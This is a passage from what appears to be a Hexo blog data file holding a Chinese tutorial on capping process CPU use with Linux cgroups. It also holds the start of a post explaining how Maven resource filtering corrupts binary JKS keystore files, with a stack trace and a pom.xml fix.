添加限制的进程\n\n```\nroot@ubuntu:/sys/fs/cgroup/cpu/test$ echo -e \"1234\" > tasks\n```\n\n虽然上面写文件使用的符号是单大于号`>`，但实际上并不会覆盖原本文件，实际效果是添加一个pid为1234的进程到该cgroup组中\n\n### 移除进程限制\n\n在cgroup数中，一个进程必须属于一个cgroup，所以不能从一个cgroup凭空删除一个进程，只能将进程移动到其他cgroup节点，所以删除操作也便成为了将进程移动到cgroup树的根节点\n\n```\nroot@ubuntu:/sys/fs/cgroup/cpu/test$ echo \"15007\" > ../tasks\n```\n\n### 删除cgroup组\n\n删除cgroup文件夹即可，但这里使用`rm -rf test`是行不通的，需要使用`rmdir`命令。（删除时需确保cgroup组中没有进程存在）\n\n```\nroot@ubuntu:/sys/fs/cgroup/cpu$ rmdir test\n```\n\n","slug":"linux-cgroup-cpu","published":1,"updated":"2020-01-23T08:21:31.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck5qhi06k001sg0uk2hoxyv2u","content":"<p>要实现linux限制进程上限的功能，需要用到Cgroups技术，它的全程Linux Control Group，用于限制一个进程组能够使用的资源（CPU、内存、磁盘、网络带宽）上限，还能够对进程进行优先级设置，以及进行将进程挂起恢复的操作。</p>\n<p>Cgroups给用户暴露出来的操作接口是文件系统，以目录和文件的方式组织在<code>/sys/fs/cgroup</code>路径下。</p>\n<p>执行<code>ls /sys/fs/cgroup</code>命令可以看到如下文件列表</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@ubuntu:$ ls /sys/fs/cgroup</span><br><span class=\"line\">blkio  cpuacct      cpuset   freezer  memory   net_cls,net_prio  perf_event  rdma     unified</span><br><span class=\"line\">cpu    cpu,cpuacct  devices  hugetlb  net_cls  net_prio          pids        systemd</span><br></pre></td></tr></table></figure>\n\n<p>代表了可操作的各种资源</p>\n<p>以cpu资源为例，查看<code>cpu</code>目录，执行<code>ls /sys/fs/cgroup/cpu</code>可以看到如下列表</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@ubuntu:$ ls /sys/fs/cgroup/cpu</span><br><span class=\"line\">cgroup.clone_children  cpuacct.usage_all          cpuacct.usage_user  notify_on_release  user.slice</span><br><span class=\"line\">cgroup.procs           cpuacct.usage_percpu       cpu.cfs_period_us   release_agent</span><br><span class=\"line\">cgroup.sane_behavior   cpuacct.usage_percpu_sys   cpu.cfs_quota_us    system.slice</span><br><span class=\"line\">cpuacct.stat           cpuacct.usage_percpu_user  cpu.shares          tasks</span><br><span class=\"line\">cpuacct.usage          cpuacct.usage_sys          cpu.stat</span><br></pre></td></tr></table></figure>\n\n<p>其中<code>tasks</code>文件列出了受限制的进程pid列表，<code>cpu.cfs_period_us</code>和<code>cpu.cfs_quota_us</code>文件搭配使用可以达到限制cpu使用率的目的，打开两个文件分别看到内容如下</p>\n<p><code>cpu.cfs_period_us</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">100000</span><br></pre></td></tr></table></figure>\n\n<p><code>cpu.cfs_quota_us</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-1</span><br></pre></td></tr></table></figure>\n\n<p>表示100000us时间内不限制分配的cpu时间长度（-1表示不限制，如果将-1换成30000则表示允许分配30000us即30ms的cpu时间）</p>\n<h2 id=\"实践一下\"><a href=\"#实践一下\" class=\"headerlink\" title=\"实践一下\"></a>实践一下</h2><p>cgroup是树型结构的，可以在当前树下新建子节点，根目录<code>/sys/fs/cgroup/cpu</code>一般表示整个计算机。所以我们不是直接操作<code>/sys/fs/cgroup/cpu</code>下面的文件，而是在目录树下创建一个名为<code>test</code>的子目录，查看目录可以发现操作系统会在新建的<code>test</code>目录下自动生成了该系统对应的资源限制文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@ubuntu:$ cd /sys/fs/cgroup/cpu</span><br><span class=\"line\">root@ubuntu:/sys/fs/cgroup/cpu$ mkdir test</span><br><span class=\"line\">root@ubuntu:/sys/fs/cgroup/cpu$ cd test</span><br><span class=\"line\">root@ubuntu:/sys/fs/cgroup/cpu$ </span><br><span class=\"line\">root@ubuntu:/sys/fs/cgroup/cpu/test$ ls</span><br><span class=\"line\">cgroup.clone_children  cpuacct.usage         cpuacct.usage_percpu_sys   cpuacct.usage_user  cpu.shares         tasks</span><br><span class=\"line\">cgroup.procs           cpuacct.usage_all     cpuacct.usage_percpu_user  cpu.cfs_period_us   cpu.stat</span><br><span class=\"line\">cpuacct.stat           cpuacct.usage_percpu  cpuacct.usage_sys          cpu.cfs_quota_us    notify_on_release</span><br></pre></td></tr></table></figure>\n\n<p>接下来，先启动两个用于测试的死循环进程，进程号分别为15007和15952</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@ubuntu:/sys/fs/cgroup/cpu/test$ while : ; do : ; done &amp;</span><br><span class=\"line\">[1] 15007</span><br><span class=\"line\">root@ubuntu:/sys/fs/cgroup/cpu/test$ while : ; do : ; done &amp;</span><br><span class=\"line\">[2] 15952</span><br></pre></td></tr></table></figure>\n\n<p>查看此时的cpu使用情况，cpu使用率达到了93.8%</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  PID USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND</span><br><span class=\"line\">15952 root      20   0   22776   2960   1212 R 50.0  0.1  18:18.90 bash</span><br><span class=\"line\">15007 root      20   0   22776   1684      0 R 43.8  0.1  24:04.92 bash</span><br></pre></td></tr></table></figure>\n\n<p>修改<code>cpu.cfs_quota_us</code>文件和<code>tasks</code>文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@ubuntu:/sys/fs/cgroup/cpu/test$ echo &quot;40000&quot; &gt; cpu.cfs_quota_us</span><br><span class=\"line\">root@ubuntu:/sys/fs/cgroup/cpu/test$ echo -e &quot;15007\\n15952&quot; &gt; tasks</span><br></pre></td></tr></table></figure>\n\n<p>查看此时的cpu使用情况，发现cpu使用率成功降下来了</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  PID USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND</span><br><span class=\"line\">15952 root      20   0   22776   2960   1212 R 20.3  0.1  20:04.56 bash</span><br><span class=\"line\">15007 root      20   0   22776   1684      0 R 19.9  0.1  25:50.57 bash</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"添加限制的进程\"><a href=\"#添加限制的进程\" class=\"headerlink\" title=\"添加限制的进程\"></a>添加限制的进程</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@ubuntu:/sys/fs/cgroup/cpu/test$ echo -e &quot;1234&quot; &gt; tasks</span><br></pre></td></tr></table></figure>\n\n<p>虽然上面写文件使用的符号是单大于号<code>&gt;</code>，但实际上并不会覆盖原本文件，实际效果是添加一个pid为1234的进程到该cgroup组中</p>\n<h3 id=\"移除进程限制\"><a href=\"#移除进程限制\" class=\"headerlink\" title=\"移除进程限制\"></a>移除进程限制</h3><p>在cgroup数中，一个进程必须属于一个cgroup，所以不能从一个cgroup凭空删除一个进程，只能将进程移动到其他cgroup节点，所以删除操作也便成为了将进程移动到cgroup树的根节点</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@ubuntu:/sys/fs/cgroup/cpu/test$ echo &quot;15007&quot; &gt; ../tasks</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"删除cgroup组\"><a href=\"#删除cgroup组\" class=\"headerlink\" title=\"删除cgroup组\"></a>删除cgroup组</h3><p>删除cgroup文件夹即可，但这里使用<code>rm -rf test</code>是行不通的，需要使用<code>rmdir</code>命令。（删除时需确保cgroup组中没有进程存在）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@ubuntu:/sys/fs/cgroup/cpu$ rmdir test</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<p>要实现linux限制进程上限的功能，需要用到Cgroups技术，它的全程Linux Control Group，用于限制一个进程组能够使用的资源（CPU、内存、磁盘、网络带宽）上限，还能够对进程进行优先级设置，以及进行将进程挂起恢复的操作。</p>\n<p>Cgroups给用户暴露出来的操作接口是文件系统，以目录和文件的方式组织在<code>/sys/fs/cgroup</code>路径下。</p>\n<p>执行<code>ls /sys/fs/cgroup</code>命令可以看到如下文件列表</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@ubuntu:$ ls /sys/fs/cgroup</span><br><span class=\"line\">blkio  cpuacct      cpuset   freezer  memory   net_cls,net_prio  perf_event  rdma     unified</span><br><span class=\"line\">cpu    cpu,cpuacct  devices  hugetlb  net_cls  net_prio          pids        systemd</span><br></pre></td></tr></table></figure>\n\n<p>代表了可操作的各种资源</p>\n<p>以cpu资源为例，查看<code>cpu</code>目录，执行<code>ls /sys/fs/cgroup/cpu</code>可以看到如下列表</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@ubuntu:$ ls /sys/fs/cgroup/cpu</span><br><span class=\"line\">cgroup.clone_children  cpuacct.usage_all          cpuacct.usage_user  notify_on_release  user.slice</span><br><span class=\"line\">cgroup.procs           cpuacct.usage_percpu       cpu.cfs_period_us   release_agent</span><br><span class=\"line\">cgroup.sane_behavior   cpuacct.usage_percpu_sys   cpu.cfs_quota_us    system.slice</span><br><span class=\"line\">cpuacct.stat           cpuacct.usage_percpu_user  cpu.shares          tasks</span><br><span class=\"line\">cpuacct.usage          cpuacct.usage_sys          cpu.stat</span><br></pre></td></tr></table></figure>\n\n<p>其中<code>tasks</code>文件列出了受限制的进程pid列表，<code>cpu.cfs_period_us</code>和<code>cpu.cfs_quota_us</code>文件搭配使用可以达到限制cpu使用率的目的，打开两个文件分别看到内容如下</p>\n<p><code>cpu.cfs_period_us</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">100000</span><br></pre></td></tr></table></figure>\n\n<p><code>cpu.cfs_quota_us</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-1</span><br></pre></td></tr></table></figure>\n\n<p>表示100000us时间内不限制分配的cpu时间长度（-1表示不限制，如果将-1换成30000则表示允许分配30000us即30ms的cpu时间）</p>\n<h2 id=\"实践一下\"><a href=\"#实践一下\" class=\"headerlink\" title=\"实践一下\"></a>实践一下</h2><p>cgroup是树型结构的，可以在当前树下新建子节点，根目录<code>/sys/fs/cgroup/cpu</code>一般表示整个计算机。所以我们不是直接操作<code>/sys/fs/cgroup/cpu</code>下面的文件，而是在目录树下创建一个名为<code>test</code>的子目录，查看目录可以发现操作系统会在新建的<code>test</code>目录下自动生成了该系统对应的资源限制文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@ubuntu:$ cd /sys/fs/cgroup/cpu</span><br><span class=\"line\">root@ubuntu:/sys/fs/cgroup/cpu$ mkdir test</span><br><span class=\"line\">root@ubuntu:/sys/fs/cgroup/cpu$ cd test</span><br><span class=\"line\">root@ubuntu:/sys/fs/cgroup/cpu$ </span><br><span class=\"line\">root@ubuntu:/sys/fs/cgroup/cpu/test$ ls</span><br><span class=\"line\">cgroup.clone_children  cpuacct.usage         cpuacct.usage_percpu_sys   cpuacct.usage_user  cpu.shares         tasks</span><br><span class=\"line\">cgroup.procs           cpuacct.usage_all     cpuacct.usage_percpu_user  cpu.cfs_period_us   cpu.stat</span><br><span class=\"line\">cpuacct.stat           cpuacct.usage_percpu  cpuacct.usage_sys          cpu.cfs_quota_us    notify_on_release</span><br></pre></td></tr></table></figure>\n\n<p>接下来，先启动两个用于测试的死循环进程，进程号分别为15007和15952</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@ubuntu:/sys/fs/cgroup/cpu/test$ while : ; do : ; done &amp;</span><br><span class=\"line\">[1] 15007</span><br><span class=\"line\">root@ubuntu:/sys/fs/cgroup/cpu/test$ while : ; do : ; done &amp;</span><br><span class=\"line\">[2] 15952</span><br></pre></td></tr></table></figure>\n\n<p>查看此时的cpu使用情况，cpu使用率达到了93.8%</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  PID USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND</span><br><span class=\"line\">15952 root      20   0   22776   2960   1212 R 50.0  0.1  18:18.90 bash</span><br><span class=\"line\">15007 root      20   0   22776   1684      0 R 43.8  0.1  24:04.92 bash</span><br></pre></td></tr></table></figure>\n\n<p>修改<code>cpu.cfs_quota_us</code>文件和<code>tasks</code>文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@ubuntu:/sys/fs/cgroup/cpu/test$ echo &quot;40000&quot; &gt; cpu.cfs_quota_us</span><br><span class=\"line\">root@ubuntu:/sys/fs/cgroup/cpu/test$ echo -e &quot;15007\\n15952&quot; &gt; tasks</span><br></pre></td></tr></table></figure>\n\n<p>查看此时的cpu使用情况，发现cpu使用率成功降下来了</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  PID USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND</span><br><span class=\"line\">15952 root      20   0   22776   2960   1212 R 20.3  0.1  20:04.56 bash</span><br><span class=\"line\">15007 root      20   0   22776   1684      0 R 19.9  0.1  25:50.57 bash</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"添加限制的进程\"><a href=\"#添加限制的进程\" class=\"headerlink\" title=\"添加限制的进程\"></a>添加限制的进程</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@ubuntu:/sys/fs/cgroup/cpu/test$ echo -e &quot;1234&quot; &gt; tasks</span><br></pre></td></tr></table></figure>\n\n<p>虽然上面写文件使用的符号是单大于号<code>&gt;</code>，但实际上并不会覆盖原本文件，实际效果是添加一个pid为1234的进程到该cgroup组中</p>\n<h3 id=\"移除进程限制\"><a href=\"#移除进程限制\" class=\"headerlink\" title=\"移除进程限制\"></a>移除进程限制</h3><p>在cgroup数中，一个进程必须属于一个cgroup，所以不能从一个cgroup凭空删除一个进程，只能将进程移动到其他cgroup节点，所以删除操作也便成为了将进程移动到cgroup树的根节点</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@ubuntu:/sys/fs/cgroup/cpu/test$ echo &quot;15007&quot; &gt; ../tasks</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"删除cgroup组\"><a href=\"#删除cgroup组\" class=\"headerlink\" title=\"删除cgroup组\"></a>删除cgroup组</h3><p>删除cgroup文件夹即可，但这里使用<code>rm -rf test</code>是行不通的，需要使用<code>rmdir</code>命令。（删除时需确保cgroup组中没有进程存在）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@ubuntu:/sys/fs/cgroup/cpu$ rmdir test</span><br></pre></td></tr></table></figure>\n\n"},{"title":"使用jks文件，本地运行没问题，打包到服务器出现java.io.IOException:\\ Invalid\\ keystore\\ format","date":"2017-03-19T04:08:42.000Z","keywords":"maven, Invalid keystore format, jks","rId":"MB-17031901","_content":"\n错误信息：\n```\njava.io.IOException: Invalid keystore format\n\tat sun.security.provider.JavaKeyStore.engineLoad(JavaKeyStore.java:658)\n\tat sun.security.provider.JavaKeyStore$JKS.engineLoad(JavaKeyStore.java:56)\n\tat sun.security.provider.KeyStoreDelegator.engineLoad(KeyStoreDelegator.java:224)\n\tat sun.security.provider.JavaKeyStore$DualFormatJKS.engineLoad(JavaKeyStore.java:70)\n\tat java.security.KeyStore.load(KeyStore.java:1445)\n\tat com.csii.payment.client.util.Util.getKeyStore(Util.java:446)\n\tat com.csii.payment.client.key.KeyManager.getKeyStore(KeyManager.java:185)\n\tat com.csii.payment.client.key.KeyManager.initMerchantJKS(KeyManager.java:144)\n\tat com.csii.payment.client.key.KeyManager.initJKSInfoUseNewMerchantProperties(KeyManager.java:109)\n\tat com.csii.payment.client.key.KeyManager.<clinit>(KeyManager.java:85)\n\tat com.csii.payment.client.core.MerchantSignTool.checkSignParam(MerchantSignTool.java:571)\n\tat com.csii.payment.client.core.MerchantSignTool.sign(MerchantSignTool.java:89)\n\tat com.csii.payment.client.core.MerchantSignTool$sign.call(Unknown Source)\n\tat org.codehaus.groovy.runtime.callsite.CallSiteArray.defaultCall(CallSiteArray.java:48)\n\tat org.codehaus.groovy.runtime.callsite.AbstractCallSite.call(AbstractCallSite.java:113)\n\tat org.codehaus.groovy.runtime.callsite.AbstractCallSite.call(AbstractCallSite.java:125)\n\tat com.yoochatting.market.v5.service.impl.PayServiceImpl.checkPayGuangda(PayServiceImpl.groovy:680)\n\tat sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n\tat sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\n\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\n\tat java.lang.reflect.Method.invoke(Method.java:498)\n\tat org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(AopUtils.java:317)\n\tat org.springframework.aop.framework.ReflectiveMethodInvocation.invokeJoinpoint(ReflectiveMethodInvocation.java:190)\n\tat org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:157)\n\tat org.springframework.transaction.interceptor.TransactionInterceptor$1.proceedWithInvocation(TransactionInterceptor.java:99)\n\tat org.springframework.transaction.interceptor.TransactionAspectSupport.invokeWithinTransaction(TransactionAspectSupport.java:281)\n\tat org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:96)\n\tat org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:179)\n\tat org.springframework.aop.interceptor.ExposeInvocationInterceptor.invoke(ExposeInvocationInterceptor.java:92)\n\tat org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:179)\n\tat org.springframework.aop.framework.JdkDynamicAopProxy.invoke(JdkDynamicAopProxy.java:207)\n\tat com.sun.proxy.$Proxy92.checkPayGuangda(Unknown Source)\n\tat com.yoochatting.market.v5.service.PayService$checkPayGuangda.call(Unknown Source)\n\tat org.codehaus.groovy.runtime.callsite.CallSiteArray.defaultCall(CallSiteArray.java:48)\n\tat org.codehaus.groovy.runtime.callsite.AbstractCallSite.call(AbstractCallSite.java:113)\n\tat com.yoochatting.market.ctrl.AndroidBuyerbV5Controller.guangdaPayOrder(AndroidBuyerbV5Controller.groovy:618)\n\tat sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n\tat sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\n\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\n\tat java.lang.reflect.Method.invoke(Method.java:498)\n\tat org.springframework.web.bind.annotation.support.HandlerMethodInvoker.invokeHandlerMethod(HandlerMethodInvoker.java:177)\n\tat org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter.invokeHandlerMethod(AnnotationMethodHandlerAdapter.java:446)\n\tat org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter.handle(AnnotationMethodHandlerAdapter.java:434)\n\tat org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:943)\n\tat org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:877)\n\tat org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:966)\n\tat org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:857)\n\tat javax.servlet.http.HttpServlet.service(HttpServlet.java:624)\n\tat org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:842)\n\tat javax.servlet.http.HttpServlet.service(HttpServlet.java:731)\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:303)\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)\n\tat org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:241)\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)\n\tat org.tuckey.web.filters.urlrewrite.RuleChain.handleRewrite(RuleChain.java:176)\n\tat org.tuckey.web.filters.urlrewrite.RuleChain.doRules(RuleChain.java:145)\n\tat org.tuckey.web.filters.urlrewrite.UrlRewriter.processRequest(UrlRewriter.java:92)\n\tat org.tuckey.web.filters.urlrewrite.UrlRewriteFilter.doFilter(UrlRewriteFilter.java:394)\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:241)\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)\n\tat org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:747)\n\tat org.apache.catalina.core.ApplicationDispatcher.processRequest(ApplicationDispatcher.java:485)\n\tat org.apache.catalina.core.ApplicationDispatcher.doForward(ApplicationDispatcher.java:410)\n\tat org.apache.catalina.core.ApplicationDispatcher.forward(ApplicationDispatcher.java:337)\n\tat org.tuckey.web.filters.urlrewrite.NormalRewrittenUrl.doRewrite(NormalRewrittenUrl.java:213)\n\tat org.tuckey.web.filters.urlrewrite.RuleChain.handleRewrite(RuleChain.java:171)\n\tat org.tuckey.web.filters.urlrewrite.RuleChain.doRules(RuleChain.java:145)\n\tat org.tuckey.web.filters.urlrewrite.UrlRewriter.processRequest(UrlRewriter.java:92)\n\tat org.tuckey.web.filters.urlrewrite.UrlRewriteFilter.doFilter(UrlRewriteFilter.java:394)\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:241)\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)\n\tat org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:88)\n\tat org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:241)\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)\n\tat org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:218)\n\tat org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:122)\n\tat org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:505)\n\tat org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:169)\n\tat org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:103)\n\tat org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:958)\n\tat org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:116)\n\tat org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:452)\n\tat org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1087)\n\tat org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:637)\n\tat org.apache.tomcat.util.net.AprEndpoint$SocketProcessor.doRun(AprEndpoint.java:2517)\n\tat org.apache.tomcat.util.net.AprEndpoint$SocketProcessor.run(AprEndpoint.java:2506)\n\tat java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)\n\tat java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)\n\tat org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)\n\tat java.lang.Thread.run(Thread.java:748)\n```\n\n\n出现该错误，大都是因为maven将resources下文件拷到classes下的时候导致的，当filtering为true时，maven会在拷贝文件过程中进行变量替换，这导致原文件格式发生变化。而对于jks、so等二进制文件，文件内任意的字节变化都有可能导致文件不符合格式规范，所以会出现报错情况。\n\nfiltering参数官方的解释如下\n```\nfiltering: is true or false, denoting if filtering is to be enabled for this resource. Note, that filter *.properties files do not have to be defined for filtering to occur - resources can also use properties that are by default defined in the POM (such as ${project.version}), passed into the command line using the \"-D\" flag (for example, \"-Dname=value\") or are explicitly defined by the properties element. Filter files were covered above.\n```\n意思是，maven会根据`<build><filters> <filter>filters/filter1.properties</filter> </filters></build>`下所定义的变量值、pom文件内默认的诸如`project.version`之类的变量，以及运行命令中-D参数定义的变量，对文件中的${}位置进行变量的替换，该机制在某些情景中应用很有意义，例如：想要在项目中获取pom文件中规定的项目版本号，可以在config.properties中增加一行：`version=${project.version}`，即可使config.properties中的版本号和pom文件保持一致。即使没有匹配的变量，filtering为true时也不可避免的对文件中的某些字节进行了修改。\n\n\n\n解决办法是，如果没有需要变量替换的情况，可以最简单的将filtering设为false，否则需将二进制文件单独定义拷贝，并将filtering参数设置为false：\n```\n<resource>\n\t<directory>${basedir}/src/main/resources</directory>\n\t<includes>\n\t\t<include>abcd.so</include>\n\t</includes>\n\t<filtering>false</filtering>\n</resource>\n```\n在pom文件中指定该文件拷贝规则filtering为false\n\n\n","source":"_posts/2017-03-19_maven_filter.md","raw":"---\ntitle: 使用jks文件，本地运行没问题，打包到服务器出现java.io.IOException:\\ Invalid\\ keystore\\ format\ndate: 2017-03-19 12:08:42\ntags: maven\npermalink: maven-filter\nkeywords: maven, Invalid keystore format, jks\nrId: MB-17031901\n---\n\n错误信息：\n```\njava.io.IOException: Invalid keystore format\n\tat sun.security.provider.JavaKeyStore.engineLoad(JavaKeyStore.java:658)\n\tat sun.security.provider.JavaKeyStore$JKS.engineLoad(JavaKeyStore.java:56)\n\tat sun.security.provider.KeyStoreDelegator.engineLoad(KeyStoreDelegator.java:224)\n\tat sun.security.provider.JavaKeyStore$DualFormatJKS.engineLoad(JavaKeyStore.java:70)\n\tat java.security.KeyStore.load(KeyStore.java:1445)\n\tat com.csii.payment.client.util.Util.getKeyStore(Util.java:446)\n\tat com.csii.payment.client.key.KeyManager.getKeyStore(KeyManager.java:185)\n\tat com.csii.payment.client.key.KeyManager.initMerchantJKS(KeyManager.java:144)\n\tat com.csii.payment.client.key.KeyManager.initJKSInfoUseNewMerchantProperties(KeyManager.java:109)\n\tat com.csii.payment.client.key.KeyManager.<clinit>(KeyManager.java:85)\n\tat com.csii.payment.client.core.MerchantSignTool.checkSignParam(MerchantSignTool.java:571)\n\tat com.csii.payment.client.core.MerchantSignTool.sign(MerchantSignTool.java:89)\n\tat com.csii.payment.client.core.MerchantSignTool$sign.call(Unknown Source)\n\tat 